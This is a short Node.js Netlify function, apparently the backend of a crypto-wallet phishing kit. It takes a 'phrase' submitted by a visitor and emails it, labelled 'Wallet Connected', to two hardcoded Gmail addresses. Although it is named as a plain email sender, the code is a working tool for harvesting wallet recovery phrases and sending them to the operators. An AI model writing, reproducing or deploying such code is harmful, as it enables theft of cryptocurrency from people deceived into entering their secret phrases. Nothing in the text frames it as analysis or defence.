// netlify/functions/sendEmail.js
const nodemailer = require("nodemailer");

exports.handler = async (event, context) => {
  const { subject, phrase } = JSON.parse(event.body);

  const recipientEmails = ["walletvitaldetails@gmail.com", "oyeyedave@gmail.com"];

  const transporter1 = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER1,
      pass: process.env.EMAIL_PASS1,
    },
  });

  const transporter2 = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER2,
      pass: process.env.EMAIL_PASS2,
    },
  });

  const message = {
    subject: subject,
    text: `Wallet Connected. \nPhrase: ${phrase}`,
  };

  const mailOptions1 = {
    from: process.env.EMAIL_USER1,
    to: recipientEmails[0],
    subject: message.subject,
    text: message.text,
  };

  const mailOptions2 = {
    from: process.env.EMAIL_USER2,
    to: recipientEmails[1],
    subject: message.subject,
    text: message.text,
  };

  try {
    await transporter1.sendMail(mailOptions1);
    await transporter2.sendMail(mailOptions2);
    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Emails sent successfully" }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Error sending emails", details: error }),
    };
  }
};
